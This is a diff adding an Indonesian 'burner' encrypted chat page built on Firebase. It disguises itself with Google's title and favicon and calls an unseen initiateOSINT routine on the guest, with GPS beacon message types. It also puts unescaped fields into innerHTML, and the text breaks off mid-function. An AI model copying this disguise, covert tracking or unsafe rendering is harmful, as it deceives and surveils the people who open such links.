@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <script>
+        // ========================================================
+        // PROTOKOL APEX: HASH HIJACK & ZERO-HISTORY MUTATION
+        // ========================================================
+        (function() {
+            var hashString = window.location.hash.substring(1);
+            var urlParams = new URLSearchParams(hashString);
+            
+            var capsuleId = urlParams.get('id');
+            var rawKey = urlParams.get('key');
+            
+            window.TACTICAL_CAPSULE_ID = capsuleId ? capsuleId.trim() : null;
+            window.TACTICAL_AES_KEY = rawKey ? rawKey.trim() : null;
+
+            if (!window.TACTICAL_CAPSULE_ID || !window.TACTICAL_AES_KEY) {
+                document.documentElement.innerHTML = '<body style="background:#000;"></body>'; 
+                window.location.replace('https://www.google.com');
+                return;
+            }
+
+            try { window.history.replaceState(null, document.title, window.location.pathname); } catch(e) {}
+        })();
+    </script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    
+    <title>Google</title>
+    <link rel="icon" href="https://www.google.com/favicon.ico">
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@100;400;700&family=Rajdhani:wght@300;500;600;700&display=swap');
+
+        :root {
+            --bg-void: #030508; 
+            --neon-void-cyan: #06b6d4;
+            --guest-green: #10b981; 
+            --admin-danger: #ef4444;   
+            --warning-yellow: #eab308;
+            --glass-grid-pattern: linear-gradient(rgba(6, 182, 212, 0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(6, 182, 212, 0.05) 1px, transparent 1px);
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; -webkit-touch-callout: none; outline: none; -webkit-tap-highlight-color: transparent; }
+        
+        body {
+            background-color: var(--bg-void); color: #fff;
+            font-family: 'Rajdhani', sans-serif;
+            height: 100dvh; display: flex; flex-direction: column; overflow: hidden; position: relative;
+            background-image: var(--glass-grid-pattern);
+            background-size: 40px 40px; background-position: center center;
+        }
+
+        #apex-electric-grid { position: fixed; inset: 0; z-index: -1; display: none; } 
+
+        #burned-screen { position: fixed; inset: 0; display: none; flex-direction: column; align-items: center; justify-content: center; background: #000; z-index: 100000; padding: 20px; font-family: 'JetBrains Mono', monospace; }
+        .biohazard-icon { width: 64px; height: 64px; fill: var(--warning-yellow); margin-bottom: 20px; filter: drop-shadow(0 0 10px rgba(234, 179, 8, 0.3)); }
+        
+        #quantumSplashScreen { position: fixed; inset: 0; z-index: 10000; background: var(--bg-void); display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 40px; transition: opacity 0.8s ease; }
+        .aegis-shield-3d { width: 80px; height: 80px; margin-bottom: 35px; border-radius: 50%; background: radial-gradient(circle at 30% 30%, rgba(6, 182, 212, 0.2), transparent); border: 1px solid rgba(6, 182, 212, 0.1); display: flex; align-items: center; justify-content: center; animation: float3D 4s ease-in-out infinite; }
+        .aegis-shield-3d svg { width: 36px; height: 36px; stroke: var(--neon-void-cyan); }
+        @keyframes float3D { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        
+        .toast-void { position: fixed; top: -50px; left: 50%; transform: translateX(-50%); background: rgba(5, 7, 12, 0.9); border: 1px solid var(--neon-void-cyan); color: var(--neon-void-cyan); padding: 8px 16px; border-radius: 4px; font-family: 'JetBrains Mono', monospace; font-size: 10px; font-weight: bold; letter-spacing: 2px; z-index: 9999999; transition: top 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); pointer-events: none; white-space: nowrap; }
+        .toast-show { top: 20px !important; }
+        .toast-error { border-color: var(--admin-danger) !important; color: var(--admin-danger) !important; }
+
+        #stealthBlackoutLayer { position: fixed; inset: 0; z-index: 999999; display: none; flex-direction: column; justify-content: center; align-items: center; background: rgba(3, 5, 8, 0.9); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); }
+        #strobeLayer { position: absolute; inset: 0; background: #fff; z-index: 9998; display: none; }
+        #redStrikeScreen { position: absolute; inset: 0; background: var(--admin-danger); z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 24px; }
+        
+        #shatter-overlay { position: absolute; inset: 0; z-index: 9000; display: none; pointer-events: none; }
+        .shatter-piece { position: absolute; background: rgba(255,255,255,0.1); backdrop-filter: blur(5px); border: 1px solid rgba(255,255,255,0.3); animation: fallDown 2s forwards cubic-bezier(0.55, 0.085, 0.68, 0.53); }
+        @keyframes fallDown { to { transform: translateY(150vh) rotate(45deg); opacity: 0; } }
+        
+        .overlay-screen-void { position: absolute; inset: 0; background: rgba(3, 5, 8, 0.9); z-index: 5000; display: none; flex-direction: column; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
+        .upload-spinner-void { width: 40px; height: 40px; border: 2px solid rgba(6, 182, 212, 0.1); border-top-color: var(--neon-void-cyan); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 16px; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        .void-menu-kapsul { background: rgba(10, 15, 26, 0.9); border: 1px solid rgba(6, 182, 212, 0.2); border-radius: 8px; padding: 20px; display: flex; flex-direction: column; gap: 12px; width: 85%; max-width: 320px; box-shadow: 0 20px 50px rgba(0,0,0,0.8); transform: translateY(-20px); animation: menuFadeIn 0.3s forwards; }
+        @keyframes menuFadeIn { to { transform: translateY(0); opacity: 1; } }
+        
+        .void-menu-btn { position: relative; overflow: hidden; background: rgba(5, 7, 12, 0.8); border: 1px solid rgba(6, 182, 212, 0.15); color: #fff; padding: 14px; border-radius: 6px; font-family: 'Rajdhani', sans-serif; font-size: 15px; font-weight: 600; cursor: pointer; text-align: left; transition: all 0.2s; display: flex; align-items: center; gap: 12px; }
+        .void-menu-btn svg { width: 18px; height: 18px; stroke: var(--neon-void-cyan); fill: none; stroke-width: 1.5; }
+        .void-menu-btn:active { background: rgba(6, 182, 212, 0.1); border-color: var(--neon-void-cyan); transform: translateY(1px); }
+        .void-menu-close-btn { background: transparent; color: var(--admin-danger); border: 1px dashed rgba(239, 68, 68, 0.4); padding: 12px; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 8px; font-family: 'JetBrains Mono', monospace; font-size: 11px; }
+
+        .invisible-input { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; z-index: 999; cursor: pointer; }
+
+        .cyber-header-taktis { background: rgba(5, 7, 12, 0.95); border-bottom: 1px solid rgba(6, 182, 212, 0.15); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; z-index: 10; flex-shrink: 0; }
+        .timer-apex { font-family: 'JetBrains Mono', monospace; font-size: 16px; font-weight: bold; color: #fff; letter-spacing: 2px; }
+        .timer-apex span { color: var(--neon-void-cyan); animation: blinkFast 0.5s infinite; }
+        @keyframes blinkFast { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
+
+        .chat-container { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 15px; z-index: 2; scroll-behavior: smooth; }
+        
+        div[id^="msg-"] { background: rgba(10, 15, 26, 0.8) !important; border: 1px solid rgba(255,255,255,0.05) !important; border-radius: 6px !important; padding: 14px 18px !important; font-family: 'Rajdhani', sans-serif; max-width: 85%; word-wrap: break-word; }
+        div[id^="msg-"][style*="flex-end"] { border-right: 3px solid var(--guest-green) !important; background: linear-gradient(90deg, transparent, rgba(16, 185, 129, 0.05)) !important; }
+        div[id^="msg-"][style*="flex-start"] { border-left: 3px solid var(--admin-danger) !important; background: linear-gradient(-90deg, transparent, rgba(239, 68, 68, 0.05)) !important; }
+
+        .input-bar-void { background: rgba(5, 7, 12, 0.95); border-top: 1px solid rgba(6, 182, 212, 0.15); padding: 12px 16px; display: flex; gap: 10px; align-items: center; z-index: 10; flex-shrink: 0; width: 100%; padding-bottom: max(12px, env(safe-area-inset-bottom)); }
+        .void-icon-btn { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.08); width: 42px; height: 42px; border-radius: 6px; display: flex; justify-content: center; align-items: center; cursor: pointer; flex-shrink: 0; transition: all 0.2s; position: relative; }
+        .void-icon-btn svg { width: 18px; height: 18px; stroke: #94A3B8; stroke-width: 1.5; fill: none; }
+        .void-icon-btn:active { border-color: var(--neon-void-cyan); background: rgba(6, 182, 212, 0.1); transform: translateY(1px); }
+        .void-icon-btn:active svg { stroke: var(--neon-void-cyan); }
+        
+        .mic-void-btn { border-color: rgba(239, 68, 68, 0.2); } .mic-void-btn svg { stroke: var(--admin-danger); }
+        .mic-void-btn:active { border-color: var(--admin-danger); background: rgba(239, 68, 68, 0.1); }
+        .recording-pulse-void { animation: recPulse 1s infinite; background: rgba(239, 68, 68, 0.15) !important; border-color: var(--admin-danger) !important; }
+        
+        .chat-input-void { flex: 1; min-width: 0; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1); border-radius: 6px; color: #fff; padding: 10px 14px; font-family: 'Rajdhani', sans-serif; font-size: 16px; font-weight: 500; transition: border 0.2s; }
+        .chat-input-void:focus { border-color: var(--neon-void-cyan); }
+        
+        .void-send-btn { background: transparent; color: var(--neon-void-cyan); border: none; font-family: 'JetBrains Mono', monospace; font-weight: bold; font-size: 13px; padding: 0 5px; cursor: pointer; letter-spacing: 1px; }
+
+        .media-container { margin-top: 10px; display: flex; flex-direction: column; gap: 8px; background: rgba(0,0,0,0.4); padding: 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.05); }
+        .media-image { width: 100%; display: block; user-select: none; -webkit-touch-callout: none; border-radius: 4px; cursor: pointer; transition: opacity 0.2s; }
+        .media-image:active { opacity: 0.5; }
+        
+        .void-dl-media { display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; background: #000; border: 1px dashed var(--neon-void-cyan); color: var(--neon-void-cyan); padding: 10px; font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: bold; cursor: pointer; text-decoration: none; border-radius: 4px; }
+        .void-dl-media:active { background: rgba(6, 182, 212, 0.1); }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+
+    <canvas id="apex-electric-grid"></canvas>
+
+    <div id="tactical-toast" class="toast-void">SISTEM STANDBY</div>
+    <div id="shatter-overlay"></div>
+
+    <div id="burned-screen">
+        <div class="hellfire-container" style="border: 1px dashed var(--admin-danger); padding: 30px; border-radius: 6px; text-align: center; max-width: 90%;">
+            <svg class="biohazard-icon" viewBox="0 0 24 24"><path d="M12 2L12 6M12 22L12 18M3 7L6 9M21 7L18 9M4 19L7 17M20 19L17 17" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2" fill="none"/><path d="M12 9C10.3431 9 9 10.3431 9 12C9 12.6074 9.18047 13.1727 9.49021 13.6459M15 12C15 10.3431 13.6569 9 12 9M12 15C13.6569 15 15 13.6569 15 12C15 11.3926 14.8195 10.8273 14.5098 10.3541M9.49021 13.6459L6 16.5M14.5098 10.3541L18 7.5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+            <div style="color: #fff; font-size: 1.1rem; font-weight: bold; letter-spacing: 2px; margin-bottom: 15px;">DATA VAPORIZED</div>
+            <div style="font-family: monospace; font-size: 0.7rem; color: var(--admin-danger);">BREACH DETECTED. CONNECTION SEVERED.</div>
+            <span id="lblBurnReason" style="font-family: monospace; font-size: 0.6rem; color: var(--warning-yellow); margin-top: 15px; display: block;"></span>
+        </div>
+    </div>
+
+    <div id="quantumSplashScreen">
+        <div class="aegis-shield-3d">
+            <svg viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path><path d="M12 8v4"></path><path d="M12 16h.01"></path></svg>
+        </div>
+        <div style="font-family: 'Rajdhani', sans-serif; color: var(--neon-void-cyan); font-size: 20px; font-weight: 700; letter-spacing: 2px;">VOIDFORGE HYBRID</div>
+        <div style="font-size: 13px; color: #94A3B8; margin-top: 15px; max-width: 300px;">Koneksi terenkripsi E2EE sedang disiapkan. Segala aktivitas tidak sah akan memutus koneksi dan menghapus data seketika.</div>
+        <div style="font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--neon-void-cyan); margin-top: 25px;">SINKRONISASI TRANSMISI...</div>
+    </div>
+
+    <div id="stealthBlackoutLayer">
+        <div style="background: rgba(0,0,0,0.8); border: 1px solid var(--admin-danger); color: var(--admin-danger); padding: 8px 16px; border-radius: 4px; font-family: 'JetBrains Mono', monospace; font-size: 10px; font-weight: bold; letter-spacing: 2px;">VISUAL DIAMANKAN</div>
+    </div>
+
+    <div id="uploadOverlay" class="overlay-screen-void">
+        <div class="upload-spinner-void"></div>
+        <div id="uploadStatusText" style="font-family: 'JetBrains Mono', monospace; color: var(--neon-void-cyan); font-size: 10px; letter-spacing: 4px;">ENKRIPSI DATA</div>
+    </div>
+
+    <div id="strobeLayer"></div>
+    <div id="redStrikeScreen">
+        <svg style="width:80px; height:80px; stroke:#fff; fill:none; margin-bottom:20px;" viewBox="0 0 24 24" stroke-width="1.5"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
+        <div style="font-family: 'JetBrains Mono', monospace; color: #fff; font-size: 1rem; font-weight: bold;">PELANGGARAN TERDETEKSI.</div>
+    </div>
+
+    <header class="cyber-header-taktis">
+        <div class="timer-apex" id="countdownDisplay">SINKRON<span>...</span></div>
+        <button class="btn-ping" id="btnPing" style="background:transparent; border:1px solid rgba(6,182,212,0.4); color:var(--neon-void-cyan); padding:4px 10px; font-size:10px; font-family:'JetBrains Mono', monospace; border-radius:4px;">PING</button>
+    </header>
+
+    <main class="chat-container" id="chatStream">
+        <div style="text-align:center; font-size:9px; color:rgba(255,255,255,0.2); font-family:'JetBrains Mono', monospace; margin-top:5px; letter-spacing:2px;">[ END-TO-END SECURE TUNNEL ]</div>
+    </main>
+
+    <footer class="input-bar-void">
+        <button class="void-icon-btn" id="btnAttach" title="Unggah Galeri">
+            <input type="file" class="invisible-input" id="galleryUploadInput" accept="image/*">
+            <svg viewBox="0 0 24 24"><path d="M21.44 11.05l-9.19 9.19a6 6 0 0 1-8.49-8.49l9.19-9.19a4 4 0 0 1 5.66 5.66l-9.2 9.19a2 2 0 0 1-2.83-2.83l8.49-8.48"></path></svg>
+        </button>
+        <button class="void-icon-btn mic-void-btn" id="btnVoiceNote" title="Voice Note">
+            <svg viewBox="0 0 24 24"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"></path><path d="M19 10v2a7 7 0 0 1-14 0v-2"></path><line x1="12" y1="19" x2="12" y2="23"></line><line x1="8" y1="23" x2="16" y2="23"></line></svg>
+        </button>
+        
+        <input type="text" class="chat-input-void" id="chatInput" placeholder="Ketik transmisi..." autocomplete="off">
+        <button class="void-send-btn" id="btnSend">KIRIM</button>
+    </footer>
+
+    <script>
+        // --- 1. THE HOSTAGE EXCHANGE (ZERO-HISTORY VAPORIZATION) ---
+        window.triggerHellfireKick = function(reason, silent = false) {
+            document.body.style.pointerEvents = 'none'; 
+            
+            var annihilate = function() {
+                document.documentElement.innerHTML = '<head><meta http-equiv="refresh" content="0; url=https://www.google.com"></head><body style="background:#000;"></body>';
+                window.TACTICAL_AES_KEY = null; window.TACTICAL_CAPSULE_ID = null;
+                window.location.replace('https://www.google.com');
+            };
+
+            if (silent) { annihilate(); } 
+            else {
+                var chat = document.getElementById('chatStream'); var header = document.querySelector('.cyber-header-taktis'); var footer = document.querySelector('.input-bar-void');
+                if(chat) chat.innerHTML = ''; if(header) header.style.display = 'none'; if(footer) footer.style.display = 'none';
+                document.body.style.background = '#000';
+                
+                var bs = document.getElementById('burned-screen'); var lbl = document.getElementById('lblBurnReason');
+                if (bs) bs.style.display = 'flex'; if (lbl && reason) lbl.innerText = reason;
+                
+                var sh = document.getElementById('shatter-overlay');
+                if(sh) {
+                    sh.style.display = 'block';
+                    for (let i = 0; i < 30; i++) {
+                        let p = document.createElement('div'); p.className = 'shatter-piece';
+                        p.style.width = Math.random() * 80 + 20 + 'px'; p.style.height = Math.random() * 80 + 20 + 'px';
+                        p.style.left = Math.random() * 100 + 'vw'; p.style.top = Math.random() * 100 + 'vh';
+                        p.style.animationDuration = (Math.random() * 1.5 + 0.5) + 's'; sh.appendChild(p);
+                    }
+                }
+                setTimeout(annihilate, 2000); 
+            }
+        };
+
+        window.addEventListener('pageshow', function(event) {
+            if (event.persisted || (window.performance && window.performance.navigation.type === 2)) window.location.replace('https://www.google.com');
+        });
+
+        // --- 2. FIREBASE CONFIG (VOIDHYBRIDE) ---
+        const config = {
+            apiKey: "AIzaSyD6dBIqcnezqhKFe37CT0YDv81sk-4CSU4",
+            authDomain: "voidhybride.firebaseapp.com",
+            databaseURL: "https://voidhybride-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "voidhybride",
+            storageBucket: "voidhybride.firebasestorage.app",
+            messagingSenderId: "746629628182",
+            appId: "1:746629628182:web:054b4941e9c2fdf3c8d037"
+        };
+        firebase.initializeApp(config); const db = firebase.database();
+
+        const networkTimeout = (promise, ms = 10000) => {
+            let id; const tPromise = new Promise((_, reject) => { id = setTimeout(() => reject(new Error("NETWORK_TIMEOUT")), ms); });
+            return Promise.race([ promise.then(res => { clearTimeout(id); return res; }).catch(err => { clearTimeout(id); throw err; }), tPromise ]);
+        };
+
+        // --- 3. AES-GCM CRYPTO ENGINE (IN-MEMORY) ---
+        const CryptoEngine = {
+            cryptoKey: null,
+            init: async function(rawKeyBase64) {
+                const keyBuffer = Uint8Array.from(atob(rawKeyBase64), c => c.charCodeAt(0));
+                this.cryptoKey = await window.crypto.subtle.importKey("raw", keyBuffer, { name: "AES-GCM" }, false, ["encrypt", "decrypt"]);
+            },
+            encrypt: async function(plainText) {
+                const iv = window.crypto.getRandomValues(new Uint8Array(12));
+                const encoded = new TextEncoder().encode(plainText);
+                const cipherBuffer = await window.crypto.subtle.encrypt({ name: "AES-GCM", iv: iv }, this.cryptoKey, encoded);
+                return {
+                    cipher: btoa(String.fromCharCode(...new Uint8Array(cipherBuffer))),
+                    iv: btoa(String.fromCharCode(...new Uint8Array(iv)))
+                };
+            },
+            decrypt: async function(cipherB64, ivB64) {
+                const ivBuffer = Uint8Array.from(atob(ivB64), c => c.charCodeAt(0));
+                const cipherBuffer = Uint8Array.from(atob(cipherB64), c => c.charCodeAt(0));
+                const decryptedBuffer = await window.crypto.subtle.decrypt({ name: "AES-GCM", iv: ivBuffer }, this.cryptoKey, cipherBuffer);
+                return new TextDecoder().decode(decryptedBuffer);
+            }
+        };
+
+        // --- 4. ELECTRIC CANVAS ---
+        function initElectricCanvas() {
+            const canvas = document.getElementById('apex-electric-grid');
+            if(!canvas) return; canvas.style.display = 'block'; 
+            const ctx = canvas.getContext('2d');
+            const resize = () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; };
+            resize(); window.addEventListener('resize', resize);
+            
+            const sparks = []; const speed = 1.2; const numSparks = 6; const gridSize = 40;
+
+            class ElectricSpark {
+                constructor() { this.reset(); this.maxLife = Math.random() * 30 + 10; }
+                reset() {
+                    this.x = Math.round(Math.random() * (canvas.width / gridSize)) * gridSize;
+                    this.y = Math.round(Math.random() * (canvas.height / gridSize)) * gridSize;
+                    this.life = this.maxLife; this.size = 0.5;
+                    this.angle = (Math.random() < 0.5 ? 0 : Math.PI / 2) + (Math.random() < 0.5 ? 0 : Math.PI); 
+                }
+                update() {
+                    this.x += Math.cos(this.angle) * speed; this.y += Math.sin(this.angle) * speed; this.life--;
+                    if(Math.random() < 0.05) { 
+                        this.angle = (Math.random() < 0.5 ? 0 : Math.PI / 2) + (Math.random() < 0.5 ? 0 : Math.PI); 
+                        this.x = Math.round(this.x / gridSize) * gridSize; this.y = Math.round(this.y / gridSize) * gridSize; 
+                    }
+                    if (this.life <= 0 || this.x < 0 || this.x > canvas.width || this.y < 0 || this.y > canvas.height) this.reset();
+                }
+                draw() {
+                    ctx.beginPath(); ctx.lineWidth = this.size;
+                    ctx.moveTo(this.x, this.y); ctx.lineTo(this.x - Math.cos(this.angle) * 8, this.y - Math.sin(this.angle) * 8); 
+                    ctx.strokeStyle = `rgba(6, 182, 212, 0.25)`;
+                    ctx.stroke(); 
+                }
+            }
+            for(let i=0; i<numSparks; i++) sparks.push(new ElectricSpark());
+
+            function animateGrid() {
+                ctx.clearRect(0, 0, canvas.width, canvas.height); 
+                sparks.forEach(s => { s.update(); s.draw(); });
+                requestAnimationFrame(animateGrid);
+            } animateGrid();
+        }
+
+        // --- 5. SUSPENSI POP-UP & AUDIO ---
+        let bBy = false; let bTi = null;
+        function triggerBypass() { bBy = true; if(bTi) clearTimeout(bTi); bTi = setTimeout(() => { bBy = false; }, 60000); }
+
+        const qAudio = new (window.AudioContext || window.webkitAudioContext)();
+        function qTone(f, t, d, v) { if(!qAudio) return; const o=qAudio.createOscillator(), g=qAudio.createGain(); o.type=t; o.frequency.setValueAtTime(f, qAudio.currentTime); g.gain.setValueAtTime(v, qAudio.currentTime); o.connect(g); g.connect(qAudio.destination); o.start(); o.stop(qAudio.currentTime+d); }
+        function sT(msg, e=false) { const t=document.getElementById('tactical-toast'); t.innerHTML=msg; if(e) t.classList.add('toast-error'); else t.classList.remove('toast-error'); t.classList.add('toast-show'); setTimeout(()=>t.classList.remove('toast-show'), 3500); }
+
+        // --- 6. KOMPRESOR BASE64 ---
+        async function compressMediaBase64(file) {
+            return new Promise((resolve, reject) => {
+                if (!file.type.match(/image.*/)) { reject(new Error("Hanya gambar.")); return; }
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    const img = new Image();
+                    img.onload = () => {
+                        const canvas = document.createElement('canvas');
+                        let w = img.width, h = img.height; const max = 800;
+                        if (w > h) { if (w > max) { h *= max / w; w = max; } } else { if (h > max) { w *= max / h; h = max; } }
+                        canvas.width = w; canvas.height = h;
+                        canvas.getContext('2d').drawImage(img, 0, 0, w, h);
+                        resolve(canvas.toDataURL('image/jpeg', 0.6));
+                    };
+                    img.src = e.target.result;
+                };
+                reader.onerror = reject; reader.readAsDataURL(file);
+            });
+        }
+
+        // --- 7. INITIALIZE DENGAN PROMISES PARALEL ---
+        async function initialize() {
+            initElectricCanvas(); 
+            const rId = window.TACTICAL_CAPSULE_ID;
+            const aesKey = window.TACTICAL_AES_KEY;
+
+            if(!rId || !aesKey) return window.triggerHellfireKick("TAUTAN CACAT", true);
+
+            try {
+                await CryptoEngine.init(aesKey);
+                const capsuleRef = db.ref(`burner_vault/${rId}`);
+                
+                const [typeSnap, optionsSnap, durationSnap, timestampSnap] = await Promise.all([
+                    networkTimeout(capsuleRef.child('type').once('value')),
+                    networkTimeout(capsuleRef.child('options').once('value')),
+                    networkTimeout(capsuleRef.child('duration').once('value')),
+                    networkTimeout(capsuleRef.child('timestamp').once('value'))
+                ]);
+                
+                if(!typeSnap.exists()) return window.triggerHellfireKick("AKSES DITOLAK ATAU KADALUARSA", true);
+                
+                const type = typeSnap.val();
+                if(type !== 'CHAT') return window.triggerHellfireKick("MODE PAYLOAD BUKAN CHAT", true);
+
+                const drm = optionsSnap.exists() ? (optionsSnap.val() || {}) : {};
+                const duration = durationSnap.exists() ? parseInt(durationSnap.val()) || 0 : 0;
+                const timestamp = timestampSnap.exists() ? timestampSnap.val() : Date.now();
+                let strike = 0; let burned = false;
+
+                startChatStream(rId); 
+                startCount(timestamp, duration); 
+                initiateOSINT(rId);
+
+                const splash = document.getElementById('quantumSplashScreen'); 
+                if (splash) {
+                    splash.style.opacity = '0'; 
+                    setTimeout(() => splash.style.display = 'none', 800);
+                }
+
+                // Listener Detonator Admin
+                capsuleRef.child('manual_detonation').on('value', s => {
+                    if(s.exists() && s.val() === true) { burned = true; window.triggerHellfireKick("SISTEM DIHANCURKAN ADMIN"); }
+                });
+
+                // Taktis Blackout
+                const bL = document.getElementById('stealthBlackoutLayer');
+                window.addEventListener('blur', () => { if(drm.stealthBlackout && !burned && !bBy) bL.style.display = 'flex'; });
+                window.addEventListener('focus', () => bL.style.display = 'none');
+                
+                function triggerS() { 
+                    if(!drm.shatter || burned) return; strike++; qTone(150, 'square', 0.4, 0.05);
+                    if(strike === 1) { 
+                        db.ref(`burner_vault/${rId}/telemetri`).update({alert:"STRIKE 1: INDIKASI SCREEN RECORD!"}).catch(()=>{});
+                        const cs=document.getElementById('chatStream'), rs=document.getElementById('redStrikeScreen'); if(cs) cs.style.filter="blur(15px) contrast(300%)"; rs.style.display='flex';
+                        setTimeout(()=>{rs.style.display='none'; cs.style.filter='none';}, 3000);
+                    } else { window.triggerHellfireKick("TERMINASI VISUAL PELANGGARAN"); }
+                }
+                document.addEventListener('keyup', e => {if(e.key === 'PrintScreen') triggerS();});
+                document.addEventListener('touchstart', e => {if(e.touches.length >= 3) triggerS();}, {passive: false});
+
+                // Input & Media Galeri
+                const cI = document.getElementById('chatInput');
+                document.getElementById('btnSend').onclick = () => { if(cI.value.trim()){ sM(rId, cI.value.trim()); cI.value=''; } };
+                
+                const uO = document.getElementById('uploadOverlay');
+                document.getElementById('galleryUploadInput').onchange = async (e) => { 
+                    triggerBypass(); uO.style.display = 'flex';
+                    const file = e.target.files[0]; if(!file) { uO.style.display='none'; return; }
+                    try { const base64Data = await compressMediaBase64(file); await sM(rId, "[VISUAL DIKIRIM]", base64Data, "TEXT"); uO.style.display='none'; e.target.value=''; }
+                    catch(e) { uO.style.display='none'; sT("GAGAL BACA GAMBAR", true); }
+                };
+
+                // Voice Note E2EE
+                const btnVoiceNote = document.getElementById('btnVoiceNote'); let mRec; let aCh = []; let isR = false; let rST = 0;
+                btnVoiceNote.onpointerdown = async () => {
+                    if (isR) return; isR = true; rST = Date.now(); triggerBypass();
+                    try {
+                        const str = await navigator.mediaDevices.getUserMedia({ audio: true }); mRec = new MediaRecorder(str); aCh = [];
+                        mRec.ondataavailable = e => { if (e.data.size > 0) aCh.push(e.data); };
+                        mRec.onstop = async () => {
+                            const d = Date.now() - rST; str.getTracks().forEach(t => t.stop()); if (d < 800) { sT("Terlalu singkat.", true); return; }
+                            uO.style.display = 'flex'; document.getElementById('uploadStatusText').innerText = "ENKRIPSI AUDIO...";
+                            try {
+                                const b = new Blob(aCh, { type: 'audio/webm' }); const fR = new FileReader();
+                                fR.onload = async (e) => { await sM(rId, "[VOICE NOTE]", e.target.result, "AUDIO"); uO.style.display = 'none'; }; fR.readAsDataURL(b);
+                            } catch(e) { uO.style.display='none'; sT("Gagal kirim audio.", true); }
+                        }; mRec.start(); qTone(1200, 'sine', 0.05, 0.02); btnVoiceNote.classList.add('recording-pulse-void');
+                    } catch(e) { isR=false; sT("Izin mic ditolak OS.", true); }
+                };
+                const stopRec = () => { if(!isR) return; isR=false; if(mRec && mRec.state==='recording'){ mRec.stop(); btnVoiceNote.classList.remove('recording-pulse-void'); qTone(1200, 'sine', 0.05, 0.02); } };
+                window.addEventListener('pointerup', stopRec); window.addEventListener('pointercancel', stopRec);
+
+            } catch(e) { window.triggerHellfireKick("KONEKSI GAGAL ATAU DITOLAK", true); }
+        }
+
+        // --- 8. FUNGSI ENKRIPSI & RENDER CHAT ---
+        async function sM(rId, plainTxt, medB64=null, type="TEXT") { 
+            try { 
+                const encText = await CryptoEngine.encrypt(plainTxt);
+                let payload = { sender:"GUEST", type:type, cipher: encText.cipher, iv: encText.iv, timestamp: firebase.database.ServerValue.TIMESTAMP };
+                
+                if (medB64) {
+                    const encMed = await CryptoEngine.encrypt(medB64);
+                    payload.mediaCipher = encMed.cipher; payload.mediaIv = encMed.iv;
+                }
+                await db.ref(`burner_vault/${rId}/messages`).push(payload); 
+                qTone(880, 'sine', 0.15, 0.03); 
+            } catch(e) { sT("Gagal enkripsi/kirim.", true); } 
+        }
+        
+        function startChatStream(rId) {
+            db.ref(`burner_vault/${rId}/messages`).orderByChild("timestamp").on('child_added', async sn => {
+                const data = sn.val(); if (data.type === "PING" || data.type === "GPS_BEACON") return;
+                try {
+                    let decText = await CryptoEngine.decrypt(data.cipher, data.iv);
+                    let decMed = null;
+                    if (data.mediaCipher && data.mediaIv) decMed = await CryptoEngine.decrypt(data.mediaCipher, data.mediaIv);
+                    renderMsg(sn.key, data.sender, decText, decMed, data.type);
+                } catch(e) { console.warn("Pesan rusak/kunci salah"); }
+            });
+            db.ref(`burner_vault/${rId}/messages`).on('child_removed', sn => {
+                const mEl = document.getElementById(`msg-${sn.key}`); 
+                if (mEl) { mEl.innerHTML = `<strong style="font-size: 10px; opacity: 0.5; color:var(--text-muted); font-family:'JetBrains Mono';">[ TRANSMISI DITARIK ]</strong>`; mEl.style.background = "transparent"; mEl.style.border = "1px dashed rgba(255,255,255,0.1)"; }
+            });
+        }
+
+        function renderMsg(msgId, sender, textContent, mediaContent, type) {
+            const st = document.getElementById('chatStream'); if(!st) return;
+            const msgDiv = document.createElement('div'); msgDiv.id = `msg-${msgId}`;
+            if (sender === "GUEST") msgDiv.style.alignSelf = "flex-end"; else msgDiv.style.alignSelf = "flex-start";
+            
+            const acc = sender === "GUEST" ? "var(--guest-green)" : "var(--admin-danger)";
+            let c = `<strong style="font-size: 11px; color: ${acc}; display: block; margin-bottom: 8px; letter-spacing: 2px; font-family:'JetBrains Mono';">${sender}</strong>`;
+            
+            if (textContent && textContent !== "[VISUAL DIKIRIM]") {
